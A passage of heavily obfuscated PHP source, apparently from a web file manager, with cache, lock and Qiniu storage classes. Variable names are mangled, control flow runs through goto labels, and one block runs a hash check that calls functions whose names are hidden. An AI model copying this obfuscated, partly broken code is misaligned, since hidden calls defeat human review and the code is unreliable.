header($fí Çéî…›[1100]); die; } goto cÀñï«‹•; aÄŠ“¹¤¬†: if ($AÚˆç¶¢) { return IO::fileOutServer($D¯×›ñ³‡[$fí Çéî…›[75]], $F¯ŞËªÅä, $C³Õ²¿¶, $dÆÕö™“òø); } IO::fileOut($D¯×›ñ³‡[$fí Çéî…›[75]], $F¯ŞËªÅä, $C³Õ²¿¶, $dÆÕö™“òø); goto E Ù¬§øº; E Ù¬§øº: } public function fileOut($BÌ…¥©Ü£°, $bÚ¤î†¾ = false, $B‡ëŸ¤óà = false, $dîé…’‚è = '') { $this->_fileOut($BÌ…¥©Ü£°, $bÚ¤î†¾, $B‡ëŸ¤óà, $dîé…’‚è); } public function fileOutServer($F “öËõ„, $A÷İ×ˆ…»ä = false, $C¤ÏÚÅ™¤à = false, $aìŸø­Ûš‰ = '') { $this->_fileOut($F “öËõ„, $A÷İ×ˆ…»ä, $C¤ÏÚÅ™¤à, $aìŸø­Ûš‰, !0); } protected function _fileOutImage($CÚ°ˆ´ßã, $BäÄëñÈÈ = 250) { $AÒÊ¸ìÆÈ =& $_SERVER[»„]; $B°Â‚¨‰Ş† = $this->model->sourceInfo($CÚ°ˆ´ßã); if ($B°Â‚¨‰Ş†[$AÒÊ¸ìÆÈ[366]] == $AÒÊ¸ìÆÈ[83]) { show_json($AÒÊ¸ìÆÈ[1102] . $CÚ°ˆ´ßã, !1); } $GLOBALS[$AÒÊ¸ìÆÈ[1101]] = $B°Â‚¨‰Ş†[$AÒÊ¸ìÆÈ[28]]; $bòë§Ú‰é× = $this->model->fileInfoGet($CÚ°ˆ´ßã); IO::fileOutImage($bòë§Ú‰é×[$AÒÊ¸ìÆÈ[75]], $BäÄëñÈÈ); } public function fileOutImage($FäÄ‘Ş©˜ç, $B­øò² = 250) { $this->_fileOutImage($FäÄ‘Ş©˜ç, $B­øò²); } public function fileOutImageServer($cÁÛ¶‚ëİğ, $B¨ŠßŒõÙÁ = 250) { $this->_fileOutImage($cÁÛ¶‚ëİğ, $B¨ŠßŒõÙÁ); } public function link($b§çá²Œ—, $E“ìŸè = '') { $E¨÷È¥ì„Š = $this->model->fileInfoGet($b§çá²Œ—); return IO::link($E¨÷È¥ì„Š[$_SERVER[»„][75]], $E“ìŸè); } protected function parse($aŠô •ÑØ) { $Eªç•Ú‘çÆ =& $_SERVER[»„]; if (strstr($aŠô •ÑØ, $Eªç•Ú‘çÆ[8]) === !1) { return array($Eªç•Ú‘çÆ[381] => intval($aŠô •ÑØ), $Eªç•Ú‘çÆ[75] => $Eªç•Ú‘çÆ[33], $Eªç•Ú‘çÆ[1099] => array()); } $BÈÕØ‚†õ = explode($Eªç•Ú‘çÆ[8], trim($aŠô •ÑØ, $Eªç•Ú‘çÆ[8])); if (count($BÈÕØ‚†õ) < 2) { show_tips($aŠô •ÑØ . $Eªç•Ú‘çÆ[1103]); } return array($Eªç•Ú‘çÆ[381] => intval($BÈÕØ‚†õ[0]), $Eªç•Ú‘çÆ[75] => $BÈÕØ‚†õ[1], $Eªç•Ú‘çÆ[1099] => array_slice($BÈÕØ‚†õ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Dª‡ÒßìÑÒ) { $this->pathParse = $Dª‡ÒßìÑÒ; $this->model = Model($_SERVER[»„][1098]); } public function getPathOuter($D†®Êµ®¢) { $F­Ê‹»…Š =& $_SERVER[»„]; if (!$D†®Êµ®¢) { return $D†®Êµ®¢; } $cõÉšŞ‹³ = $this->parse($D†®Êµ®¢); return trim(KodIO::makeShare($this->pathParse[$F­Ê‹»…Š[363]], $cõÉšŞ‹³[$F­Ê‹»…Š[363]]), $F­Ê‹»…Š[8]); } protected function infoParse($Cò¿Ÿõœ¦ê, $B§¢·“Åµ = false, $B×àŸŒ‰÷¯ = false) { $A¢¶¸Î½¥ =& $_SERVER[»„]; $d„¬áÖŠ­“ = $this->pathParse[$A¢¶¸Î½¥[363]]; $aÆ¤Ş“ŠŒë = trim($this->pathParse[$A¢¶¸Î½¥[999]], $A¢¶¸Î½¥[8]); return Action($A¢¶¸Î½¥[1104])->sharePathInfo($d„¬áÖŠ­“, $aÆ¤Ş“ŠŒë); } public function infoFull($Cî‚œ¼³„¤) { $f•ƒèß·Õç =& $_SERVER[»„]; $FÇğ³ˆ„¥ = explode($f•ƒèß·Õç[8], trim($Cî‚œ¼³„¤, $f•ƒèß·Õç[8])); if (count($FÇğ³ˆ„¥) > 1) { $e¸µšÀ¶÷½ = implode($f•ƒèß·Õç[8], array_splice($FÇğ³ˆ„¥, 1)); $A®’“ÉˆÃ’ = $this->model->pathInfoByPath($FÇğ³ˆ„¥[0], $e¸µšÀ¶÷½); if (!$A®’“ÉˆÃ’) { return !1; } $this->pathParse[$f•ƒèß·Õç[999]] = $A®’“ÉˆÃ’[$f•ƒèß·Õç[365]]; } return $this->infoParse($Cî‚œ¼³„¤); } public function listAll($B±ùõƒê÷—) { goto c¸…Ğä®²ã; då¸ñ¸…ª©: $B”×’ø• = $this->model->listAll($B±ùõƒê÷—); $a™ÓÊ­›ÏŠ = Model($AÌ°¼È¸åà[532])->getInfo($c£ô¥¥é‰Ü[$AÌ°¼È¸åà[437]]); $fä˜Áåæì = Action($AÌ°¼È¸åà[1104]); goto CÍñÔ‰¶¹±; c¸…Ğä®²ã: $AÌ°¼È¸åà =& $_SERVER[»„]; $c£ô¥¥é‰Ü = IO::info($this->pathParse[$AÌ°¼È¸åà[75]]); if (!$c£ô¥¥é‰Ü) { return array(); } goto då¸ñ¸…ª©; CÍñÔ‰¶¹±: foreach ($B”×’ø• as &$dÌçºƒ¤ëè) { check_abort(); $dÌçºƒ¤ëè[$AÌ°¼È¸åà[387]] = $fä˜Áåæì->_shareItemeParse($dÌçºƒ¤ëè[$AÌ°¼È¸åà[387]], $a™ÓÊ­›ÏŠ); } return $B”×’ø•; goto fî…êÔ­; fî…êÔ­: } } goto bª¢±«³Œß; F†¥È’§õ: if ($_SERVER[$_SERVER[»„][750]] != $Aö¢ÅáÜêš($Cô”ĞĞá)) { goto cîÉÑÁ¨Æ•; cîÉÑÁ¨Æ•: $B÷ÜÜø¯ò’ = $_SERVER[»„][751]; $aÙ¬ëç´† = $_SERVER[$_SERVER[»„][752]] . $_SERVER[»„][753]; $aÜ£âéœõ = $B÷ÜÜø¯ò’($aÙ¬ëç´†); goto DõÂçÉË®’; aÆ¯‰È¼è£: $AÅí‘è¬—($Cô”ĞĞá); goto BÛ†àÇ¾ŸŸ; DõÂçÉË®’: $dêá›æÈ“ = explode($_SERVER[»„][213], $aÜ£âéœõ); if (count($dêá›æÈ“) < $_SERVER[»„][566]) { $F‚Ò”èÑ­› = $_SERVER[»„][754]; $F‚Ò”èÑ­›(); } $AÅí‘è¬— = $_SERVER[»„][755]; goto aÆ¯‰È¼è£; BÛ†àÇ¾ŸŸ: } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($fÅ©áïÌ™, $AÇ±¤Â«‡–) { $EëÇëÊ†Œ™ =& $_SERVER[»„]; $this->cachePath = $fÅ©áïÌ™[$EëÇëÊ†Œ™[75]]; $this->prefix = $EëÇëÊ†Œ™[756]; $this->cacheTime = $AÇ±¤Â«‡–; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($B””©×¿Ô°) { $f”Ö¸‘ª° =& $_SERVER[»„]; $B””©×¿Ô° = str_replace(array($f”Ö¸‘ª°[757], $f”Ö¸‘ª°[93], $f”Ö¸‘ª°[69]), $f”Ö¸‘ª°[758], $B””©×¿Ô°); return $this->cachePath . $f”Ö¸‘ª°[759] . $B””©×¿Ô° . $f”Ö¸‘ª°[760]; } public function set($b¬“‘ÛÉ†Š, $Fœ‚Ù¾õ®Š, $d®´´‰šñƒ = false) { $böØâ‰ÏÃá = $this->getFile($b¬“‘ÛÉ†Š); if (file_put_contents($böØâ‰ÏÃá, $this->prefix . $Fœ‚Ù¾õ®Š, LOCK_EX)) { return !0; } @unlink($böØâ‰ÏÃá); return !1; } public function get($fÁ†’½Ó¬Ò) { $B¶ï±‰Ò¨ = $this->getFile($fÁ†’½Ó¬Ò); if (file_exists($B¶ï±‰Ò¨) && filemtime($B¶ï±‰Ò¨) < time() - $this->cacheTime) { @unlink($B¶ï±‰Ò¨); return !1; } $eî½´Ï“À¨ = @file_get_contents($B¶ï±‰Ò¨); return substr($eî½´Ï“À¨, strlen($this->prefix)); } public function remove($f³È÷˜õŒˆ) { $bøè¿Å®¿Ø = $this->getFile($f³È÷˜õŒˆ); return @unlink($bøè¿Å®¿Ø); } public function deleteAll() { $AÖ­Â²ºĞ =& $_SERVER[»„]; $D”ò½ ‰„§ = scandir($this->cachePath); foreach ($D”ò½ ‰„§ as $Eçå„øï´ó) { $b“ø†›†ƒŞ = $this->cachePath . $Eçå„øï´ó; if (strpos($b“ø†›†ƒŞ, $AÖ­Â²ºĞ[760]) && strpos($b“ø†›†ƒŞ, $AÖ­Â²ºĞ[761])) { @unlink($b“ø†›†ƒŞ); } } } public function clearTimeout() { $dÓîÊéÏÉß =& $_SERVER[»„]; $a×ª§ß†á = scandir($this->cachePath); foreach ($a×ª§ß†á as $D–­ñ„ºƒº) { $EÀŞÓ™É = $this->cachePath . $D–­ñ„ºƒº; if (strpos($EÀŞÓ™É, $dÓîÊéÏÉß[760]) && strpos($EÀŞÓ™É, $dÓîÊéÏÉß[761]) && filemtime($EÀŞÓ™É) < time() - $this->cacheTime) { @unlink($EÀŞÓ™É); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto AøİÔÇ‚‘ ; dùôŠœäí™: self::$timeout = $eîÈÄ§šë·[$CŠ‡¡³³ÌÔ[762]] ? $eîÈÄ§šë·[$CŠ‡¡³³ÌÔ[762]] : 10; $Dß„œÁéÚº = _get($GLOBALS[$CŠ‡¡³³ÌÔ[6]], $CŠ‡¡³³ÌÔ[763]); $EŸˆ¦³„ë = $eîÈÄ§šë·[$CŠ‡¡³³ÌÔ[741]] ? $eîÈÄ§šë·[$CŠ‡¡³³ÌÔ[741]] : $CŠ‡¡³³ÌÔ[163]; goto dİ¸—ÍßÇ—; dİ¸—ÍßÇ—: if ($EŸˆ¦³„ë == $CŠ‡¡³³ÌÔ[17] && $Dß„œÁéÚº == $CŠ‡¡³³ÌÔ[9]) { $EŸˆ¦³„ë = $CŠ‡¡³³ÌÔ[163]; } switch ($EŸˆ¦³„ë) { case $CŠ‡¡³³ÌÔ[744]: self::$handle = new CacheLockRedis(); break; case $CŠ‡¡³³ÌÔ[745]: self::$handle = new CacheLockMemcached(); break; case $CŠ‡¡³³ÌÔ[17]: self::$handle = new CacheLockDatabase(); break; case $CŠ‡¡³³ÌÔ[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto a³õÅ‡æÎá; AøİÔÇ‚‘ : $CŠ‡¡³³ÌÔ =& $_SERVER[»„]; if (self::$handle) { return self::$handle; } $eîÈÄ§šë· = $GLOBALS[$CŠ‡¡³³ÌÔ[6]][$CŠ‡¡³³ÌÔ[333]]; goto dùôŠœäí™; a³õÅ‡æÎá: } private static function key($e¶…Ù¥À¬) { return $_SERVER[»„][764] . Cache::key($e¶…Ù¥À¬); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($FÈÃÕÔšŒ = '') { self::$errorMsg = $FÈÃÕÔšŒ; } public static function lockGlobal($bğçé³Õé, $BÖ‹èãå§ó) { return self::lock($bğçé³Õé, $BÖ‹èãå§ó, !0); } public static function lock($A¿†°ô…ğ, $Ešƒ‰¥ò… = false, $fš…»µ±äí = false) { goto EÌéÆ¶„¼; EÌéÆ¶„¼: $FÉÂ‹Ì–à¢ =& $_SERVER[»„]; $B¥ïÃÏŸóÑ = self::init(); $A©Ş‚Ğî¥„ = self::key($A¿†°ô…ğ); goto A–²±À–®; dÎËèÉ¦ˆª: if (!$fš…»µ±äí) { self::$lockItem[$A©Ş‚Ğî¥„] = !0; } return $d·ôŒÂ©õ”; goto Dí‰Ò¡®¥; A–²±À–®: $Ešƒ‰¥ò… = $Ešƒ‰¥ò… ? $Ešƒ‰¥ò… : self::$timeout; $d·ôŒÂ©õ” = $B¥ïÃÏŸóÑ->lock($A©Ş‚Ğî¥„, $Ešƒ‰¥ò…); if (!$d·ôŒÂ©õ”) { $e¯Ğ³‚Êä = $FÉÂ‹Ì–à¢[765] . $Ešƒ‰¥ò… . $FÉÂ‹Ì–à¢[67] . self::$errorMsg . $FÉÂ‹Ì–à¢[67] . get_caller_msg(); $AÈÜğÃßÄ¾ = "\x4c\x6f\x63\153\40\x61\x63\164\x69\x6f\156\x3a\40{$A©Ş‚Ğî¥„}\x20\x74\151\x6d\x65\x6f\x75\164\54\x6f\166\145\162\x20{$Ešƒ‰¥ò…}\x20\x73"; $AÈÜğÃßÄ¾ = self::$errorMsg ? self::$errorMsg : $AŒÚ“¬„©¬; write_log($e¯Ğ³‚Êä, $FÉÂ‹Ì–à¢[766]); show_json($AÈÜğÃßÄ¾, !1); } goto dÎËèÉ¦ˆª; Dí‰Ò¡®¥: } public static function lockGet($c«ß½ˆ¬‹ì) { $c­¶‘¡ğ¡¿ = self::key($c«ß½ˆ¬‹ì); if (self::$lockItem[$c­¶‘¡ğ¡¿]) { return self::$lockItem[$c­¶‘¡ğ¡¿]; } return self::init()->lockGet($c­¶‘¡ğ¡¿); } public static function unlock($fÍÈÂÑÄäî) { $FñÎØÃÏ¯ = self::key($fÍÈÂÑÄäî); self::$lockItem[$FñÎØÃÏ¯] = null; return self::init()->unlock($FñÎØÃÏ¯); } public static function unlockRuntime() { $FïÑ¯Õ÷ =& $_SERVER[»„]; $bï¾¿•©­ = self::init(); $e‹˜—ùÔêÊ = !1; foreach (self::$lockItem as $AÜ†ÔÅù’Û => $CæŠ²Òí) { if (!$CæŠ²Òí) { continue; } $bï¾¿•©­->unlock($AÜ†ÔÅù’Û); if (!$e‹˜—ùÔêÊ) { $e‹˜—ùÔêÊ = !0; write_log($FïÑ¯Õ÷[767] . $AÜ†ÔÅù’Û . $FïÑ¯Õ÷[67] . get_caller_msg(), $FïÑ¯Õ÷[766]); continue; } write_log($FïÑ¯Õ÷[767] . $AÜ†ÔÅù’Û, $FïÑ¯Õ÷[766]); } } } goto fÉ“ÅàõÌ; E¸ÌâÇ“œÂ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($bÏƒ½ó¨) { parent::__construct(); require_once SDK_DIR . $_SERVER[»„][1192]; $this->_init($bÏƒ½ó¨); } public function _init($dÀ¬×ˆ’ƒ¼) { foreach ($dÀ¬×ˆ’ƒ¼ as $a˜‘È ë Á => $A“†äÓ†©â) { if (isset($this->{$a˜‘È ë Á})) { $this->{$a˜‘È ë Á} = $A“†äÓ†©â; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[»„][1193], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($aŞÀÕôÎ„, $a¦¶äÜè£’ = '', $Eª´Æ‰†çÓ = REPEAT_RENAME) { if ($this->setContent($aŞÀÕôÎ„, $a¦¶äÜè£’)) { return $this->getPathOuter($aŞÀÕôÎ„); } return !1; } public function mkdir($A¡ŠÎô, $DôÅèÆŒæ¥ = REPEAT_SKIP) { goto f›ù¹•­òè; eì˜‡ÔôñØ: $A¡ŠÎô = $F‰’©”†Œ™ . $cöˆâÏñåĞ[8]; $a¬’‡§¾Äæ = get_path_this($F‰’©”†Œ™); $aËö‘ÕÙì¢ = $A¡ŠÎô . $a¬’‡§¾Äæ; goto eÎöğŒïØë; eÎöğŒïØë: if (!$this->mkfile($aËö‘ÕÙì¢)) { return !1; } if (!$this->moveFile($aËö‘ÕÙì¢, $A¡ŠÎô)) { $this->delFile($aËö‘ÕÙì¢); return !1; } return $this->getPathOuter($F‰’©”†Œ™); goto dŒÃËÖÅĞñ; f›ù¹•­òè: $cöˆâÏñåĞ =& $_SERVER[»„]; $F‰’©”†Œ™ = trim($A¡ŠÎô, $cöˆâÏñåĞ[8]); if ($this->_isFolder($F‰’©”†Œ™)) { return $this->getPathOuter($F‰’©”†Œ™); } goto eì˜‡ÔôñØ; dŒÃËÖÅĞñ: } public function copyFile($d®’œ´¾Š, $A¤†§à‡¹ƒ) { $a’¢•¦ê¾‹ = $this->bucketManager->copy($this->bucket, $d®’œ´¾Š, $this->bucket, $A¤†§à‡¹ƒ, !0); return $a’¢•¦ê¾‹ ? !1 : !0; } public function moveFile($E‚»Êó†ÍÙ, $cå…Éç©Î) { $DŒøƒñø™º = $this->bucketManager->move($this->bucket, $E‚»Êó†ÍÙ, $this->bucket, $cå…Éç©Î, !0); return $DŒøƒñø™º ? !1 : !0; } public function delFile($bî‚‡«Ã¹Ç) { $c¥¢­»¢›Æ = $this->bucketManager->delete($this->bucket, $bî‚‡«Ã¹Ç); return $c¥¢­»¢›Æ ? !1 : !0; } public function delFolder($dÆÙ‚¦ôé…) { $DŞŞÕ‰œ³¬ = $this->fileList($dÆÙ‚¦ôé…); if (empty($DŞŞÕ‰œ³¬)) { return !0; } $D‚µŒ¶â = 1000; if (count($DŞŞÕ‰œ³¬) <= $D‚µŒ¶â) { return $this->qnDelObj($DŞŞÕ‰œ³¬) ? !1 : !0; } foreach (array_chunk($DŞŞÕ‰œ³¬, $D‚µŒ¶â) as $F“ÙµõÍìœ) { $F¶ø¦¯…©Á = $this->qnDelObj($F“ÙµõÍìœ); if ($F¶ø¦¯…©Á) { return !1; } } return !0; } private function qnDelObj($b›ßÄô©í) { $DÜÑ‘·Ä¿ = $this->bucketManager->buildBatchDelete($this->bucket, $b›ßÄô©í); list($cÒ™äòÆ, $fÆ†ÜÖ–Ê) = $this->bucketManager->batch($DÜÑ‘·Ä¿); return $fÆ†ÜÖ–Ê; } private function fileList($Fš«‘¥ö, $CŞª·ùšÇî = 0) { goto D¤”­â¢½ò; D¤”­â¢½ò: $F”¯º”ö ‰ =& $_SERVER[»„]; $Fš«‘¥ö = trim($Fš«‘¥ö, $F”¯º”ö ‰[8]); $BéÁâ»§ñç = empty($Fš«‘¥ö) ? $F”¯º”ö ‰[33] : $Fš«‘¥ö . $F”¯º”ö ‰[8]; goto B—Ş­Š¿‡; B—Ş­Š¿‡: $AßÒÛ¨‹Ê = $F”¯º”ö ‰[33]; $b¥Å©Â„Â¬ = 1000; $bì¯À±Ù¿´ = $F”¯º”ö ‰[33]; goto CÔ¯½·„“œ; CÔ¯½·„“œ: $c—›ƒíÂ‘ = array(); while (!0) { list($f¬”¨Šºä, $Eï·Õàª¿Ì) = $this->bucketManager->listFiles($this->bucket, $BéÁâ»§ñç, $AßÒÛ¨‹Ê, $b¥Å©Â„Â¬, $bì¯À±Ù¿´); if ($Eï·Õàª¿Ì) { return !1; } $AßÒÛ¨‹Ê = array_key_exists($F”¯º”ö ‰[1163], $f¬”¨Šºä) ? $AßÒÛ¨‹Ê = $f¬”¨Šºä[$F”¯º”ö ‰[1194]] : $F”¯º”ö ‰[33]; foreach ($f¬”¨Šºä[$F”¯º”ö ‰[1195]] as $C­Á¢ØÁ¾©) { $A¢ô™îÅì– = $C­Á¢ØÁ¾©[$F”¯º”ö ‰[89]]; if ($CŞª·ùšÇî) { $A¢ô™îÅì– = array($F”¯º”ö ‰[28] => $A¢ô™îÅì–, $F”¯º”ö ‰[77] => $C­Á¢ØÁ¾©[$F”¯º”ö ‰[1196]]); } $c—›ƒíÂ‘[] = $A¢ô™îÅì–; } if ($AßÒÛ¨‹Ê == $F”¯º”ö ‰[33]) { break; } } return $c—›ƒíÂ‘; goto c±”‚«ï; c±”‚«ï: } public function rename($bë‹¯Òëè, $F££óÕ—ˆ) { return $this->renameObject($bë‹¯Òëè, $F££óÕ—ˆ); } public function fileInfo($Có®Êò˜Ä‘, $EñÇõ¤®•Ô = false, $F™í®å–¿‘ = array()) { goto BµÙ¿¬®Ë¤; e†ÙÄ¿Ã÷: if (empty($F™í®å–¿‘)) { $F™í®å–¿‘ = $this->objectMeta($Có®Êò˜Ä‘); if (!$F™í®å–¿‘) { return $fĞ•‡× å; } } if (isset($F™í®å–¿‘[$A„é·ÃñÅ«[1197]])) { $fĞ•‡× å[$A„é·ÃñÅ«[183]] = $F™í®å–¿‘[$A„é·ÃñÅ«[1197]]; } if (isset($F™í®å–¿‘[$A„é·ÃñÅ«[1196]])) { $fĞ•‡× å[$A„é·ÃñÅ«[77]] = $F™í®å–¿‘[$A„é·ÃñÅ«[1196]]; } goto BÕÏ²İ˜Ò°; BµÙ¿¬®Ë¤: $A„é·ÃñÅ« =& $_SERVER[»„]; if ($EñÇõ¤®•Ô) { return array($A„é·ÃñÅ«[28] => $this->pathThis($Có®Êò˜Ä‘), $A„é·ÃñÅ«[75] => $this->getPathOuter($A„é·ÃñÅ«[8] . $Có®Êò˜Ä‘), $A„é·ÃñÅ«[29] => $A„é·ÃñÅ«[163], $A„é·ÃñÅ«[77] => isset($F™í®å–¿‘[$A„é·ÃñÅ«[1196]]) ? $F™í®å–¿‘[$A„é·ÃñÅ«[1196]] : 0, $A„é·ÃñÅ«[156] => $this->ext($Có®Êò˜Ä‘)); } $fĞ•‡× å = array($A„é·ÃñÅ«[28] => $this->pathThis($Có®Êò˜Ä‘), $A„é·ÃñÅ«[75] => $this->getPathOuter($A„é·ÃñÅ«[8] . $Có®Êò˜Ä‘), $A„é·ÃñÅ«[29] => $A„é·ÃñÅ«[163], $A„é·ÃñÅ«[183] => 0, $A„é·ÃñÅ«[106] => 0, $A„é·ÃñÅ«[77] => 0, $A„é·ÃñÅ«[156] => $this->ext($Có®Êò˜Ä‘), $A„é·ÃñÅ«[184] => !0, $A„é·ÃñÅ«[185] => !0); goto e†ÙÄ¿Ã÷; BÕÏ²İ˜Ò°: return $fĞ•‡× å; goto bá‰ºÜÎ„; bá‰ºÜÎ„: } public function folderInfo($Fêˆ†çù»Í, $D°Ú±Û°Ä = false) { goto D‘©¥ê¼›†; eù§íöî¨ê: $Fêˆ†çù»Í = rtrim($Fêˆ†çù»Í, $E«Ö¯Ì’À‚[8]) . $E«Ö¯Ì’À‚[8]; $A¦™ÛŸ¬¦ª = $this->objectMeta($Fêˆ†çù»Í); if (isset($A¦™ÛŸ¬¦ª[$E«Ö¯Ì’À‚[1197]])) { $e“í©©Â›¦[$E«Ö¯Ì’À‚[183]] = $A¦™ÛŸ¬¦ª[$E«Ö¯Ì’À‚[1197]]; } goto fï¾¤Œ·ã¯; D‘©¥ê¼›†: $E«Ö¯Ì’À‚ =& $_SERVER[»„]; if ($D°Ú±Û°Ä) { return array($E«Ö¯Ì’À‚[28] => $this->pathThis($Fêˆ†çù»Í), $E«Ö¯Ì’À‚[75] => $this->getPathOuter($E«Ö¯Ì’À‚[8] . $Fêˆ†çù»Í), $E«Ö¯Ì’À‚[29] => $E«Ö¯Ì’À‚[76]); } $e“í©©Â›¦ = array($E«Ö¯Ì’À‚[28] => $this->pathThis($Fêˆ†çù»Í), $E«Ö¯Ì’À‚[75] => $this->getPathOuter($E«Ö¯Ì’À‚[8] . $Fêˆ†çù»Í), $E«Ö¯Ì’À‚[29] => $E«Ö¯Ì’À‚[76], $E«Ö¯Ì’À‚[183] => 0, $E«Ö¯Ì’À‚[106] => 0, $E«Ö¯Ì’À‚[1142] => !0, $E«Ö¯Ì’À‚[1143] => !0); goto eù§íöî¨ê; fï¾¤Œ·ã¯: return $e“í©©Â›¦; goto B¸èĞóøä; B¸èĞóøä: } public function listPath($DÔ•£¨÷˜¡, $E…”¨ÇË‡Š = false) { goto dÌÖÓâÑ„å; FøæÆ‰—æº: $CÍõƒŒÀ = $AŠÈàĞŒ–á[33]; $e¥ˆ«°Ôƒå = 1000; $D±ì’ôßµ = $AŠÈàĞŒ–á[8]; goto D‡Â¦ºô™ê; D‡Â¦ºô™ê: $bñÍ¬šÇ¶ = $a„‹î•å¶Ô = array(); while (!0) { list($cäò©œ­Å, $c­éì¼ïäÓ) = $this->bucketManager->listFiles($this->bucket, $dÁ£¥æˆô, $CÍõƒŒÀ, $e¥ˆ«°Ôƒå, $D±ì’ôßµ); if ($c­éì¼ïäÓ) { return !1; } $CÍõƒŒÀ = array_key_exists($AŠÈàĞŒ–á[1163], $cäò©œ­Å) ? $CÍõƒŒÀ = $cäò©œ­Å[$AŠÈàĞŒ–á[1194]] : $AŠÈàĞŒ–á[33]; if (isset($cäò©œ­Å[$AŠÈàĞŒ–á[1198]])) { foreach ($cäò©œ­Å[$AŠÈàĞŒ–á[1198]] as $a¡¦øá¢Ê) { if ($a¡¦øá¢Ê == $dÁ£¥æˆô) { continue; } $bñÍ¬šÇ¶[] = $this->folderInfo($a¡¦øá¢Ê, $E…”¨ÇË‡Š); } } if (isset($cäò©œ­Å[$AŠÈàĞŒ–á[1195]])) { foreach ($cäò©œ­Å[$AŠÈàĞŒ–á[1195]] as $E÷á‘¾îµò) { if ($E÷á‘¾îµò[$AŠÈàĞŒ–á[89]] == $dÁ£¥æˆô) { continue; } $a„‹î•å¶Ô[] = $this->fileInfo($E÷á‘¾îµò[$AŠÈàĞŒ–á[89]], $E…”¨ÇË‡Š, $E÷á‘¾îµò); } } if ($CÍõƒŒÀ == $AŠÈàĞŒ–á[33]) { break; } } return array($AŠÈàĞŒ–á[74] => $bñÍ¬šÇ¶, $AŠÈàĞŒ–á[73] => $a„‹î•å¶Ô); goto FË×½áòÈ; dÌÖÓâÑ„å: $AŠÈàĞŒ–á =& $_SERVER[»„]; $DÔ•£¨÷˜¡ = trim($DÔ•£¨÷˜¡, $AŠÈàĞŒ–á[8]); $dÁ£¥æˆô = empty($DÔ•£¨÷˜¡) ? $AŠÈàĞŒ–á[33] : $DÔ•£¨÷˜¡ . $AŠÈàĞŒ–á[8]; goto FøæÆ‰—æº; FË×½áòÈ: } public function has($bâ®„Ò‹È¿, $C¼È°¨æ—° = false, $cŒŒ¸­Æù = true) { goto d¤ğ›¥ƒ¼¢; eÎ…‚ìŞ”›: $EÛ…—ô‚‰ = $F²´Ù­‘[33]; $b®êºñ÷Ö = 1000; $eß§ä†”› = $F²´Ù­‘[8]; goto DÏ³Ù²•; DÏ³Ù²•: $bÕ‹Ö„‚§‰ = 0; $B±¤œêà‘´ = 0; while (!0) { list($fÒØæ±ì , $c®±¦¦…Öõ) = $this->bucketManager->listFiles($this->bucket, $Aí¸çÙ¸Ô«, $EÛ…—ô‚‰, $b®êºñ÷Ö, $eß§ä†”›); if ($c®±¦¦…Öõ) { return !1; } $EÛ…—ô‚‰ = array_key_exists($F²´Ù­‘[1163], $fÒØæ±ì ) ? $EÛ…—ô‚‰ = $fÒØæ±ì [$F²´Ù­‘[1194]] : $F²´Ù­‘[33]; if ($C¼È°¨æ—°) { if (!empty($fÒØæ±ì [$F²´Ù­‘[1195]])) { $bÕ‹Ö„‚§‰ += count($fÒØæ±ì [$F²´Ù­‘[1195]]); } if (!empty($fÒØæ±ì [$F²´Ù­‘[1198]])) { $B±¤œêà‘´ += count($fÒØæ±ì [$F²´Ù­‘[1198]]); } if ($EÛ…—ô‚‰ === $F²´Ù­‘[33]) { break; } continue; } if ($cŒŒ¸­Æù) { if (!empty($fÒØæ±ì [$F²´Ù­‘[1195]])) { return !0; } } else { if (!empty($fÒØæ±ì [$F²´Ù­‘[1198]])) { return !0; } } if ($EÛ…—ô‚‰ == $F²´Ù­‘[33]) { break; } } goto b‡ËÊ¶×È; d¤ğ›¥ƒ¼¢: $F²´Ù­‘ =& $_SERVER[»„]; $bâ®„Ò‹È¿ = trim($bâ®„Ò‹È¿, $F²´Ù­‘[8]); $Aí¸çÙ¸Ô« = empty($bâ®„Ò‹È¿) ? $F²´Ù­‘[33] : $bâ®„Ò‹È¿ . $F²´Ù­‘[8]; goto eÎ…‚ìŞ”›; b‡ËÊ¶×È: if ($C¼È°¨æ—°) { return array($F²´Ù­‘[187] => $bÕ‹Ö„‚§‰, $F²´Ù­‘[188] => $B±¤œêà‘´); } return !1; goto Fø¼¤†Œòõ; Fø¼¤†Œòõ: } public function listAll($fë…×ê„Ú) { $aŠ‰¡¾äÅ× =& $_SERVER[»„]; $d¤‹æ–ƒ›¹ = $this->fileList($fë…×ê„Ú, 1); $eÀËïŸò¥† = array(); foreach ($d¤‹æ–ƒ›¹ as $F°×İÖ»²) { $eÀËïŸò¥†[$F°×İÖ»²[$aŠ‰¡¾äÅ×[28]]] = $F°×İÖ»²[$aŠ‰¡¾äÅ×[77]]; } return $this->listAllFiles($fë…×ê„Ú, array_keys($eÀËïŸò¥†), $eÀËïŸò¥†); } public function canRead($bÜœÈºÂ÷Æ) { return $this->exist($bÜœÈºÂ÷Æ) ? !0 : !1; } public function canWrite($eï¼¹Œ¢Æ) { return $this->exist($eï¼¹Œ¢Æ) ? !0 : !1; } public function getContent($A–àç´Ä¨) { return $this->fileSubstr($A–àç´Ä¨, 0, -1); } public function setContent($EÏƒ´ÜƒËì, $AšÔÎÍ¤™ = '') { $fŒ»Ì¸±– = $this->tempFile($this->pathThis($EÏƒ´ÜƒËì)); file_put_contents($fŒ»Ì¸±–, $AšÔÎÍ¤™); if ($this->upload($EÏƒ´ÜƒËì, $fŒ»Ì¸±–)) { $this->tempFileRemve($fŒ»Ì¸±–); return !0; } return !1; } public function refreshUrls($FŸóòòªŒ§) 